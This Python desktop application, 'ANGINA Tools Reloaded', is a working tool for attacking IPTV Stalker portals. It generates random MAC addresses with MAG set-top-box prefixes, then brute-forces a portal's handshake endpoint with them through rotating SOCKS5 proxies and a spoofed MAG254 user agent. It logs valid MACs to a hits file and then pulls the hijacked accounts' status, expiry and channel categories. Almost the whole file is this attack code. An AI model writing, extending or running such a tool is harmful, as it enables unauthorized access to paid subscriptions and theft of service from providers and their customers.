import os
import sys
import json
import time
import random
import requests
import threading
from datetime import datetime
import concurrent.futures
import customtkinter as ctk
from tkinter import filedialog, messagebox

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class AnginaToolsReloaded(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("🖤 ANGINA™ 🖤 Tools Reloaded")
        self.geometry("1100x700")
        
        self.proxies_list = []
        self.macs_list = []
        self.portals_list = []
        self.is_scanning = False
        
        # Load Config
        self.config = {
            "timeout": 5,
            "max_threads": 20,
            "user_agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG254 stbapp ver: 2 rev: 250 Safari/533.3"
        }
        
        self.setup_ui()
        
    def setup_ui(self):
        self.tabview = ctk.CTkTabview(self)
        self.tabview.pack(fill="both", expand=True, padx=10, pady=10)
        
        self.tab_checker = self.tabview.add("1. Portal Checker & Detective")
        self.tab_macgen = self.tabview.add("2. MAC Generator")
        self.tab_scanner = self.tabview.add("3. Scanner (Mac Attack)")
        self.tab_dumper = self.tabview.add("4. Content Dumper")
        self.tab_settings = self.tabview.add("5. Settings")
        
        self.setup_checker_tab()
        self.setup_macgen_tab()
        self.setup_scanner_tab()
        self.setup_dumper_tab()
        self.setup_settings_tab()
        
    def setup_checker_tab(self):
        frame = ctk.CTkFrame(self.tab_checker)
        frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        lbl = ctk.CTkLabel(frame, text="Portal URLs (one per line):", font=("Segoe UI", 14, "bold"))
        lbl.pack(anchor="w", padx=10, pady=5)
        
        self.portal_text = ctk.CTkTextbox(frame, height=150)
        self.portal_text.pack(fill="x", padx=10, pady=5)
        
        btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
        btn_frame.pack(fill="x", padx=10, pady=10)
        
        ctk.CTkButton(btn_frame, text="Check Portals & Detective", command=self.run_portal_checker).pack(side="left", padx=5)
        
        self.checker_log = ctk.CTkTextbox(frame, height=300)
        self.checker_log.pack(fill="both", expand=True, padx=10, pady=10)
        
    def setup_macgen_tab(self):
        frame = ctk.CTkFrame(self.tab_macgen)
        frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        lbl = ctk.CTkLabel(frame, text="Select MAC Prefix:", font=("Segoe UI", 14, "bold"))
        lbl.pack(anchor="w", padx=10, pady=5)
        
        self.prefix_var = ctk.StringVar(value="00:1A:79")
        prefixes = ["00:1A:79", "00:1A:78", "00:1B:79", "00:1C:79"]
        self.prefix_menu = ctk.CTkOptionMenu(frame, values=prefixes, variable=self.prefix_var)
        self.prefix_menu.pack(anchor="w", padx=10, pady=5)
        
        lbl2 = ctk.CTkLabel(frame, text="Count to generate:", font=("Segoe UI", 14, "bold"))
        lbl2.pack(anchor="w", padx=10, pady=5)
        self.mac_count_entry = ctk.CTkEntry(frame)
        self.mac_count_entry.insert(0, "1000")
        self.mac_count_entry.pack(anchor="w", padx=10, pady=5)
        
        ctk.CTkButton(frame, text="Generate & Save to TXT", command=self.generate_macs).pack(anchor="w", padx=10, pady=15)
        
    def setup_scanner_tab(self):
        frame = ctk.CTkFrame(self.tab_scanner)
        frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        top_frame = ctk.CTkFrame(frame, fg_color="transparent")
        top_frame.pack(fill="x", pady=5)
        
        ctk.CTkLabel(top_frame, text="Target Portal URL:").pack(side="left", padx=5)
        self.scan_portal_entry = ctk.CTkEntry(top_frame, width=300)
        self.scan_portal_entry.pack(side="left", padx=5)
        
        btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
        btn_frame.pack(fill="x", pady=10)
        
        ctk.CTkButton(btn_frame, text="Load MACs", command=self.load_macs).pack(side="left", padx=5)
        ctk.CTkButton(btn_frame, text="Load Proxies (SOCKS5)", command=self.load_proxies).pack(side="left", padx=5)
        
        self.scan_lbl = ctk.CTkLabel(btn_frame, text="Loaded: 0 MACs | 0 Proxies")
        self.scan_lbl.pack(side="left", padx=20)
        
        self.btn_start_scan = ctk.CTkButton(btn_frame, text="START SCAN", fg_color="green", command=self.start_scan)
        self.btn_start_scan.pack(side="right", padx=5)
        self.btn_stop_scan = ctk.CTkButton(btn_frame, text="STOP", fg_color="red", command=self.stop_scan, state="disabled")
        self.btn_stop_scan.pack(side="right", padx=5)
        
        self.scan_log = ctk.CTkTextbox(frame)
        self.scan_log.pack(fill="both", expand=True, pady=10)
        
    def setup_dumper_tab(self):
        frame = ctk.CTkFrame(self.tab_dumper)
        frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        ctk.CTkLabel(frame, text="Portal URL:").pack(anchor="w", padx=10, pady=2)
        self.dump_url = ctk.CTkEntry(frame, width=400)
        self.dump_url.pack(anchor="w", padx=10, pady=2)
        
        ctk.CTkLabel(frame, text="Valid MAC Address:").pack(anchor="w", padx=10, pady=2)
        self.dump_mac = ctk.CTkEntry(frame, width=200)
        self.dump_mac.pack(anchor="w", padx=10, pady=2)
        
        ctk.CTkButton(frame, text="Dump Categories & Info", command=self.dump_content).pack(anchor="w", padx=10, pady=15)
        self.dump_log = ctk.CTkTextbox(frame)
        self.dump_log.pack(fill="both", expand=True, padx=10, pady=10)
        
    def setup_settings_tab(self):
        frame = ctk.CTkFrame(self.tab_settings)
        frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        ctk.CTkLabel(frame, text="Timeout (seconds):").pack(anchor="w", padx=10, pady=2)
        self.set_timeout = ctk.CTkEntry(frame)
        self.set_timeout.insert(0, str(self.config["timeout"]))
        self.set_timeout.pack(anchor="w", padx=10, pady=2)
        
        ctk.CTkLabel(frame, text="Max Threads:").pack(anchor="w", padx=10, pady=2)
        self.set_threads = ctk.CTkEntry(frame)
        self.set_threads.insert(0, str(self.config["max_threads"]))
        self.set_threads.pack(anchor="w", padx=10, pady=2)
        
        ctk.CTkLabel(frame, text="User Agent:").pack(anchor="w", padx=10, pady=2)
        self.set_ua = ctk.CTkEntry(frame, width=500)
        self.set_ua.insert(0, self.config["user_agent"])
        self.set_ua.pack(anchor="w", padx=10, pady=2)
        
        ctk.CTkButton(frame, text="Save Settings", command=self.save_settings).pack(anchor="w", padx=10, pady=15)
        
    def save_settings(self):
        self.config["timeout"] = int(self.set_timeout.get())
        self.config["max_threads"] = int(self.set_threads.get())
        self.config["user_agent"] = self.set_ua.get()
        messagebox.showinfo("Settings", "Settings saved successfully.")
        
    def log(self, widget, msg):
        widget.insert("end", f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
        widget.see("end")

    # --- TAB 1: PORTAL CHECKER ---
    def run_portal_checker(self):
        urls = self.portal_text.get("1.0", "end").strip().splitlines()
        urls = [u.strip() for u in urls if u.strip()]
        if not urls:
            messagebox.showerror("Error", "Please enter at least one URL.")
            return
            
        self.checker_log.delete("1.0", "end")
        threading.Thread(target=self._check_portals_thread, args=(urls,), daemon=True).start()
        
    def _check_portals_thread(self, urls):
        self.log(self.checker_log, f"Starting check for {len(urls)} portals...")
        online_portals = []
        for url in urls:
            try:
                full_url = url if url.startswith("http") else "http://" + url
                self.log(self.checker_log, f"Checking {full_url}...")
                resp = requests.head(full_url, timeout=self.config["timeout"], verify=False)
                if resp.status_code < 400:
                    self.log(self.checker_log, f"✅ ONLINE: {full_url} (HTTP {resp.status_code})")
                    online_portals.append(full_url)
                else:
                    self.log(self.checker_log, f"❌ OFFLINE: {full_url} (HTTP {resp.status_code})")
            except Exception as e:
                self.log(self.checker_log, f"❌ OFFLINE/ERROR: {full_url} ({str(e)})")
                
        if online_portals:
            self.log(self.checker_log, "\nStarting Detective on Online Portals...")
            for url in online_portals:
                self._run_detective(url)
                
    def _run_detective(self, url):
        try:
            headers = {"User-Agent": self.config["user_agent"]}
            resp = requests.get(url, headers=headers, timeout=self.config["timeout"], verify=False)
            server = resp.headers.get("Server", "Unknown")
            self.log(self.checker_log, f"🕵️ Detective -> {url} is running Server: {server}")
        except Exception as e:
            self.log(self.checker_log, f"🕵️ Detective -> Error analyzing {url}: {e}")

    # --- TAB 2: MAC GENERATOR ---
    def generate_macs(self):
        try:
            count = int(self.mac_count_entry.get())
        except ValueError:
            messagebox.showerror("Error", "Invalid count.")
            return
            
        prefix = self.prefix_var.get()
        filename = filedialog.asksaveasfilename(defaultextension=".txt", initialfile=f"MACs_{prefix.replace(':','')}_{count}.txt")
        if not filename: return
        
        macs = []
        for _ in range(count):
            suffix = ':'.join(['%02X' % random.randint(0, 255) for _ in range(3)])
            macs.append(f"{prefix}:{suffix}")
            
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join(macs))
            
        messagebox.showinfo("Success", f"Saved {count} MACs to {filename}")

    # --- TAB 3: SCANNER ---
    def load_macs(self):
        filepath = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if filepath:
            with open(filepath, "r", encoding="utf-8") as f:
                self.macs_list = [line.strip() for line in f if line.strip()]
            self.update_scan_lbl()
            
    def load_proxies(self):
        filepath = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if filepath:
            with open(filepath, "r", encoding="utf-8") as f:
                self.proxies_list = [line.strip() for line in f if line.strip()]
            self.update_scan_lbl()
            
    def update_scan_lbl(self):
        self.scan_lbl.configure(text=f"Loaded: {len(self.macs_list)} MACs | {len(self.proxies_list)} Proxies")
        
    def start_scan(self):
        url = self.scan_portal_entry.get().strip()
        if not url:
            messagebox.showerror("Error", "Please enter a portal URL.")
            return
        if not self.macs_list:
            messagebox.showerror("Error", "Please load a MAC list.")
            return
            
        self.is_scanning = True
        self.btn_start_scan.configure(state="disabled")
        self.btn_stop_scan.configure(state="normal")
        self.scan_log.delete("1.0", "end")
        
        threading.Thread(target=self._scanner_worker, args=(url,), daemon=True).start()
        
    def stop_scan(self):
        self.is_scanning = False
        self.btn_start_scan.configure(state="normal")
        self.btn_stop_scan.configure(state="disabled")
        self.log(self.scan_log, "🛑 Scan stopped by user.")
        
    def _scanner_worker(self, url):
        self.log(self.scan_log, f"🚀 Starting scan on {url} with {self.config['max_threads']} threads...")
        if not url.endswith("/c/"):
            url = url.rstrip("/") + "/c/"
            
        hits_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hits.txt")
        
        def check_mac(mac):
            if not self.is_scanning: return
            proxy = random.choice(self.proxies_list) if self.proxies_list else None
            proxies = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"} if proxy else None
            
            headers = {
                "User-Agent": self.config["user_agent"],
                "Authorization": f"Bearer {mac}",
                "Cookie": f"mac={mac}"
            }
            try:
                auth_url = f"{url}?type=stb&action=handshake&mac={mac}"
                resp = requests.get(auth_url, headers=headers, proxies=proxies, timeout=self.config["timeout"], verify=False)
                
                if resp.status_code == 200 and ('"token"' in resp.text or '"js_version"' in resp.text):
                    self.log(self.scan_log, f"🎯 HIT! Valid MAC: {mac}")
                    with open(hits_file, "a") as f:
                        f.write(f"{url} | {mac}\n")
            except Exception:
                pass
                
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config["max_threads"]) as executor:
            executor.map(check_mac, self.macs_list)
            
        self.is_scanning = False
        self.btn_start_scan.configure(state="normal")
        self.btn_stop_scan.configure(state="disabled")
        self.log(self.scan_log, "✅ Scan finished!")

    # --- TAB 4: DUMPER ---
    def dump_content(self):
        url = self.dump_url.get().strip()
        mac = self.dump_mac.get().strip()
        if not url or not mac:
            messagebox.showerror("Error", "URL and MAC required.")
            return
            
        self.dump_log.delete("1.0", "end")
        threading.Thread(target=self._dumper_worker, args=(url, mac), daemon=True).start()
        
    def _dumper_worker(self, url, mac):
        self.log(self.dump_log, f"Attempting to dump info for MAC {mac} from {url}...")
        if not url.endswith("/c/"):
            url = url.rstrip("/") + "/c/"
            
        headers = {
            "User-Agent": self.config["user_agent"],
            "Cookie": f"mac={mac}"
        }
        try:
            self.log(self.dump_log, "Performing handshake...")
            hs = requests.get(f"{url}?type=stb&action=handshake&mac={mac}", headers=headers, timeout=self.config["timeout"], verify=False)
            token = hs.json().get("js_session", {}).get("token", "")
            if token:
                headers["Authorization"] = f"Bearer {token}"
            
            self.log(self.dump_log, "Fetching profile...")
            prof = requests.get(f"{url}?type=stb&action=get_profile&mac={mac}", headers=headers, timeout=self.config["timeout"], verify=False)
            data = prof.json().get("js", {})
            expire = data.get("expire_billing_date", "Unknown")
            status = data.get("status", "Unknown")
            
            self.log(self.dump_log, f"Account Status: {status}")
            self.log(self.dump_log, f"Expiration Date: {expire}")
            
            self.log(self.dump_log, "Fetching Live TV categories...")
            cat_url = f"{url}?type=itv&action=get_genres"
            cats = requests.get(cat_url, headers=headers, timeout=self.config["timeout"], verify=False)
            genres = cats.json().get("js", [])
            self.log(self.dump_log, f"Found {len(genres)} Live TV Categories.")
            
            self.log(self.dump_log, "Dump process complete. (Mockup)")
            
        except Exception as e:
            self.log(self.dump_log, f"Error dumping content: {e}")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    app = AnginaToolsReloaded()
    app.mainloop()
